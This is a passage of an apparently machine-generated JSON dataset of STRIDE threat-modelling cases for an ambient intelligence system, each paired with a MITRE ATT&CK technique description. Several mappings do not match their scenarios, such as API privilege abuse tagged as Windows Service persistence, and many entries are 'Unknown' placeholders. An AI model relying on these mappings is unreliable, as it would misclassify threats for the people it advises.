                "access misuse",
                "privilege abuse",
                "data leakage"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploiting unsecured APIs to gain higher access rights within the system.",
            "Assumptions": [
                {
                    "Assumption": "API endpoints are not securely protected.",
                    "Role": "System Administrator",
                    "Condition": "APIs lack authentication and authorization checks."
                },
                {
                    "Assumption": "APIs expose sensitive functionalities or data.",
                    "Role": "System Developer",
                    "Condition": "APIs are designed without considering security best practices."
                },
                {
                    "Assumption": "Attackers can interact with API endpoints without restrictions.",
                    "Role": "Attacker",
                    "Condition": "Network security controls do not restrict API access."
                }
            ],
            "Potential Impact": "Unauthorized manipulation of system functionalities and data, leading to potential breaches and abuse.",
            "MITRE ATT&CK Keywords": [
                "API exploitation",
                "access control",
                "privilege escalation",
                "system abuse"
            ],
            "mitre_technique": {
                "name": "Windows Service",
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
                "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
                "technique_id": "T1543.003"
            }
        }
    ]
},
{
    "case_number": "7",
    "batch_number": "5",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate user by capturing biometric data from sensors to access secure areas in a smart home or office.",
            "Assumptions": [
                {
                    "Assumption": "Biometric data transmission is not encrypted",
                    "Role": "Attacker",
                    "Condition": "Data captured during transit"
                },
                {
                    "Assumption": "Biometric sensors lack tamper detection mechanisms",
                    "Role": "System Designer",
                    "Condition": "Physical sensor manipulation"
                },
                {
                    "Assumption": "Users frequently use biometric authentication",
                    "Role": "Users",
                    "Condition": "High reliance on biometric data"
                }
            ],
            "Potential Impact": "Unauthorized access to secure areas and sensitive data",
            "MITRE ATT&CK Keywords": [
                "Biometric Spoofing",
                "Sensor Manipulation",
                "Unauthorized Access",
                "Physical Security"
            ],
            "mitre_technique": {
                "name": "Exploitation for Credential Access",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0\n\nCredentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.(Citation: Bugcrowd Replay Attack)(Citation: Comparitech Replay Attack)(Citation: Microsoft Midnight Blizzard Replay Attack)\n\nSuch exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.(Citation: Storm-0558 techniques for unauthorized email access)\n\nExploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",
                "id": "attack-pattern--9c306d8d-cde7-4b4c-b6e8-d0bb16caca36",
                "technique_id": "T1212"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Cybercriminals spoof user devices by cloning smart cards to gain unauthorized access to the AmI system.",
            "Assumptions": [
                {
                    "Assumption": "Smart cards have weak encryption",
                    "Role": "System Manufacturer",
                    "Condition": "Usage of outdated encryption standards"
                },
                {
                    "Assumption": "Users are not trained to detect cloned smart cards",
                    "Role": "Users",
                    "Condition": "Lack of security awareness training"
                },
                {
                    "Assumption": "Physical access to smart cards is possible",
                    "Role": "Attacker",
                    "Condition": "Physical proximity to users"
                }
            ],
            "Potential Impact": "System compromise and unauthorized control over smart environment",
            "MITRE ATT&CK Keywords": [
                "Smart Card Cloning",
                "Proximity Attack",
                "Identity Theft",
                "User Device Spoofing"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses phishing to obtain passwords and pins, thereby gaining unauthorized access to the AmI system.",
            "Assumptions": [
                {
                    "Assumption": "Users fall for phishing attacks",
                    "Role": "Users",
                    "Condition": "Inadequate phishing awareness"
                },
                {
                    "Assumption": "Passwords and pins are weak and reused",
                    "Role": "Users",
                    "Condition": "Poor password practices"
                },
                {
                    "Assumption": "Two-factor authentication is not enforced",
                    "Role": "System Administrator",
                    "Condition": "Single-factor authentication in use"
                }
            ],
            "Potential Impact": "Unauthorized access to user profiles and system configurations",
            "MITRE ATT&CK Keywords": [
                "Phishing",
                "Credential Theft",
                "Social Engineering",
                "User Authentication Spoofing"
            ],
            "mitre_technique": {
                "name": "Spearphishing Attachment",
                "description": "Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.(Citation: Unit 42 DarkHydrus July 2018) Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. ",
                "id": "attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597",
                "technique_id": "T1566.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains physical access to sensors and alters their readings to disrupt the decision-making process.",
            "Assumptions": [
                {
                    "Assumption": "Sensors are easily accessible",
                    "Role": "Attacker",
                    "Condition": "Sensors are placed in unsecured locations"
                },
                {
                    "Assumption": "Sensors lack tamper-evident features",
                    "Role": "System Designer",
                    "Condition": "No physical security measures for sensors"
                },
                {
                    "Assumption": "System does not validate sensor data integrity",
                    "Role": "System Developer",
                    "Condition": "Lack of data validation"
                }
            ],
            "Potential Impact": "Incorrect system behavior leading to security and operational failures",
            "MITRE ATT&CK Keywords": [
                "Sensor Tampering",
                "Physical Damage",
                "Data Integrity Attack",
                "IoT Sensor Manipulation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malware is introduced into data repositories to alter or delete stored historical user data and configurations.",
            "Assumptions": [
                {
                    "Assumption": "Physical or remote access to storage systems is possible",
                    "Role": "Attacker",
                    "Condition": "Weak access controls"
                },
                {
                    "Assumption": "Data repositories lack regular backups",
                    "Role": "System Administrator",
                    "Condition": "No comprehensive backup strategy"
                },
                {
                    "Assumption": "Malware detection measures are inadequate",
                    "Role": "System Developer",
                    "Condition": "Weak antivirus and antimalware solutions"
                }
            ],
            "Potential Impact": "Loss or corruption of critical data, compromising system accuracy and user experience",
            "MITRE ATT&CK Keywords": [
                "Data Repository Tampering",
                "Malware",
                "Data Corruption",
                "Storage System Attack"
            ],
            "mitre_technique": {
                "name": "Indicator Removal from Tools",
                "description": "If a malicious tool is detected and quarantined or otherwise curtailed, an adversary may be able to determine why the malicious tool was detected (the indicator), modify the tool by removing the indicator, and use the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\n\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may use [Software Packing](https://attack.mitre.org/techniques/T1045) or otherwise modify the file so it has a different signature, and then re-use the malware.",
                "id": "attack-pattern--00d0b012-8a03-410e-95de-5826bf542de6",
                "technique_id": "T1066"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and modifies communication between user devices and the AmI system, altering commands and feedback.",
            "Assumptions": [
                {
                    "Assumption": "Unencrypted communication channels are used",
                    "Role": "System Designer",
                    "Condition": "No encryption protocol"
                },
                {
                    "Assumption": "Network lacks intrusion detection systems",
                    "Role": "Network Administrator",
                    "Condition": "No monitoring for unusual activity"
                },
                {
                    "Assumption": "Users do not verify command outcomes",
                    "Role": "Users",
                    "Condition": "High trust in system outputs"
                }
            ],
            "Potential Impact": "Execution of unauthorized actions by system actuators, leading to potential physical harm or property damage",
            "MITRE ATT&CK Keywords": [
                "Communication Tampering",
                "Network Interception",
                "Command Injection",
                "Wireless Network Attack"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies sending a command that led to a system malfunction, claiming no record can link them to the action.",
            "Assumptions": [
                {
                    "Assumption": "System logs are not tamper-proof",
                    "Role": "System Administrator",
                    "Condition": "Logs do not use secure storage mechanisms"
                },
                {
                    "Assumption": "Audit trails lack detailed user activity records",
                    "Role": "System Developer",
                    "Condition": "Insufficient logging detail"
                },
                {
                    "Assumption": "No multi-factor authentication in critical actions",
                    "Role": "System Designer",
                    "Condition": "Single-factor authentication in use"
                }
            ],
            "Potential Impact": "Inability to trace actions back to users, impeding investigations and accountability",
            "MITRE ATT&CK Keywords": [
                "Log Manipulation",
                "Activity Denial",
                "Repudiation Attack",
                "Audit Trail Corruption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker modifies system logs to cover up unauthorized access attempts and subsequent activities.",
            "Assumptions": [
                {
                    "Assumption": "Logging mechanisms are not securely integrated",
                    "Role": "System Developer",
                    "Condition": "Logs stored in unprotected systems"
                },
                {
                    "Assumption": "Access controls for logs are weak",
                    "Role": "System Administrator",
                    "Condition": "Inadequate log access permissions"
                },
                {
                    "Assumption": "Automated log analysis tools are unavailable",
                    "Role": "Security Team",
                    "Condition": "No use of log monitoring tools"
                }
            ],
            "Potential Impact": "Erasure of evidence related to unauthorized activities, complicating threat detection and forensic analysis",
            "MITRE ATT&CK Keywords": [
                "Log Tampering",
                "Evidence Removal",
                "Unauthorized Modification",
                "Repudiation"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user disputes the validity of actions recorded by their account, claiming a system error as the cause.",
            "Assumptions": [
                {
                    "Assumption": "System logs lack non-repudiation measures",
                    "Role": "System Designer",
                    "Condition": "No use of cryptographic techniques for logs"
                },
                {
                    "Assumption": "Logs are not periodically reviewed",
                    "Role": "System Administrator",
                    "Condition": "No regular log audits"
                },
                {
                    "Assumption": "Users are unaware of personal activity tracking",
                    "Role": "Users",
                    "Condition": "No consent or awareness of logging practices"
                }
            ],
            "Potential Impact": "Challenges in validating the accuracy of user activity, potentially leading to unresolved disputes",
            "MITRE ATT&CK Keywords": [
                "Activity Denial",
                "User Dispute",
                "Log Integrity Compromise",
                "Repudiation Attack"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive user data captured by sensors is exposed to unauthorized parties during transmission.",
            "Assumptions": [
                {
                    "Assumption": "Data transmission occurs over insecure channels",
                    "Role": "System Designer",
                    "Condition": "Lack of encryption"
                },
                {
                    "Assumption": "No data monitoring controls in place",
                    "Role": "Network Administrator",
                    "Condition": "Lack of network traffic analysis"
                },
                {
                    "Assumption": "High volume of sensitive data transmitted",
                    "Role": "System and Users",
                    "Condition": "Frequent data capture and transmission"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of personal, biometric, or behavioral information, impacting user privacy",
            "MITRE ATT&CK Keywords": [
                "Data Leakage",
                "Sensitive Data Exposure",
                "Unauthorized Access",
                "Transmission Interception"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains unauthorized access to cloud storage, extracting sensitive user profiles and configurations.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage is inadequately secured",
                    "Role": "Cloud Administrator",
                    "Condition": "Weak authentication controls"
                },
                {
                    "Assumption": "Data encryption at rest is not implemented",
                    "Role": "System Designer",
                    "Condition": "Stored data is in plaintext"
                },
                {
                    "Assumption": "Access logs for cloud storage are not actively monitored",
                    "Role": "Security Team",
                    "Condition": "No real-time monitoring tools"
                }
            ],
            "Potential Impact": "Exposure of critical user and system information, facilitating identity theft and targeted attacks",
            "MITRE ATT&CK Keywords": [
                "Cloud Data Breach",
                "Sensitive Data Extraction",
                "Unauthorized Cloud Access",
                "Data At Rest Exposure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Confidential data from machine learning models is siphoned off by an attacker through model inversion attacks.",
            "Assumptions": [
                {
                    "Assumption": "Models are exposed to accessible endpoints",
                    "Role": "System Developer",
                    "Condition": "Endpoints lack access restrictions"
                },
                {
                    "Assumption": "No anomaly detection mechanisms in place",
                    "Role": "Security Team",
                    "Condition": "No monitoring for unusual model queries"
                },
                {
                    "Assumption": "High usage of AI/ML models for sensitive data processing",
                    "Role": "System and Users",
                    "Condition": "Frequent model access"
                }
            ],
            "Potential Impact": "Reconstruction and leakage of sensitive information used to train AI/ML models",
            "MITRE ATT&CK Keywords": [
                "Model Inversion",
                "Data Leakage",
                "AI/ML Vulnerability",
                "Confidential Data Exposure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the communication infrastructure with high-volume traffic, causing disruptions in sensor and actuator operations.",
            "Assumptions": [
                {
                    "Assumption": "Network lacks rate-limiting mechanisms",
                    "Role": "Network Administrator",
                    "Condition": "No traffic control measures"
                },
                {
                    "Assumption": "Multiple attack vectors are available",
                    "Role": "Attacker",
                    "Condition": "Exploitable network interfaces"
                },
                {
                    "Assumption": "Critical services are reliant on uninterrupted network connectivity",
                    "Role": "System Designer",
                    "Condition": "High dependency on network"
                }
            ],
            "Potential Impact": "System disruptions, causing failures in automated environment control and user dissatisfaction",
            "MITRE ATT&CK Keywords": [
                "DoS Attack",
                "Traffic Flooding",
                "Service Disruption",
                "Network Attack"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware deployed in user devices initiates a distributed DoS attack, targeting the AmI system's servers.",
            "Assumptions": [
                {
                    "Assumption": "User devices have weak malware defenses",
                    "Role": "Users",
                    "Condition": "Inadequate antivirus solutions"
                },
                {
                    "Assumption": "No network segregation to prevent lateral movement",
                    "Role": "Network Administrator",
                    "Condition": "Flat network architecture"
                },
                {
                    "Assumption": "Critical servers are not resilient to high-volume attacks",
                    "Role": "System Designer",
                    "Condition": "Non-scalable server infrastructure"
                }
            ],
            "Potential Impact": "System-wide outages and service disruptions, halting intelligent environment functionalities",
            "MITRE ATT&CK Keywords": [
                "Distributed DoS",
                "Malware Attack",
                "Service Outage",
                "Server Disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Cybercriminals exploit zero-day vulnerabilities in cloud services used for data repositories, causing service disruptions.",
            "Assumptions": [
                {
                    "Assumption": "Zero-day vulnerabilities are not patched promptly",
                    "Role": "Cloud Service Provider",
                    "Condition": "Delayed security updates"
                },
                {
                    "Assumption": "Critical service dependencies on vulnerable components",
                    "Role": "System Designer",
                    "Condition": "High reliance on cloud services"
                },
                {
                    "Assumption": "No fallback mechanisms for cloud service failures",
                    "Role": "System Administrator",
                    "Condition": "Lack of redundancy measures"
                }
            ],
            "Potential Impact": "Inability to access historical data and user profiles, impacting system learning and personalization services",
            "MITRE ATT&CK Keywords": [
                "Zero-Day Exploit",
                "Cloud Service Disruption",
                "Denial of Service",
                "Vulnerability Exploitation"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An insider exploits improperly configured access controls to grant themselves higher privileges within the system.",
            "Assumptions": [
                {
                    "Assumption": "Access controls are misconfigured or lax",
                    "Role": "System Administrator",
                    "Condition": "Errors in access policy setup"
                },
                {
                    "Assumption": "No regular audits of privilege assignments",
                    "Role": "Security Team",
                    "Condition": "Lack of periodic privilege reviews"
                },
                {
                    "Assumption": "Insider has legitimate low-level access",
                    "Role": "Insider Attacker",
                    "Condition": "Employment or authorized contract"
                }
            ],
            "Potential Impact": "Unauthorized actions, including data theft, system manipulation, and disruptions",
            "MITRE ATT&CK Keywords": [
                "Privilege Escalation",
                "Access Control Exploit",
                "Insider Threat",
                "Unauthorized Access"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A malware infection on user devices leverages software vulnerabilities to gain system-wide administrative access.",
            "Assumptions": [
                {
                    "Assumption": "User devices are running outdated software",
                    "Role": "Users",
                    "Condition": "Failure to apply updates"
                },
                {
                    "Assumption": "Vulnerabilities in commonly used software are known",
                    "Role": "Attacker",
                    "Condition": "Publicly disclosed exploits"
                },
                {
                    "Assumption": "No endpoint protection mechanisms in place",
                    "Role": "System Administrator",
                    "Condition": "Lack of robust endpoint security solutions"
                }
            ],
            "Potential Impact": "Complete system takeover, enabling unauthorized data access and potential sabotage",
            "MITRE ATT&CK Keywords": [
                "Software Exploit",
                "Malware",
                "Privilege Escalation",
                "System Compromise"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A threat actor exploits vulnerabilities in machine learning models to gain elevated access within the system.",
            "Assumptions": [
                {
                    "Assumption": "Machine learning models are not secure by design",
                    "Role": "System Developer",
                    "Condition": "Lack of security considerations"
                },
                {
                    "Assumption": "Models are accessible without stringent authentication",
                    "Role": "System Designer",
                    "Condition": "Insufficient model access controls"
                },
                {
                    "Assumption": "High reliance on machine learning for critical decisions",
                    "Role": "System and Users",
                    "Condition": "Frequent model utilization"
                }
            ],
            "Potential Impact": "Manipulation of system decisions, leading to compromised safety and security of the environment",
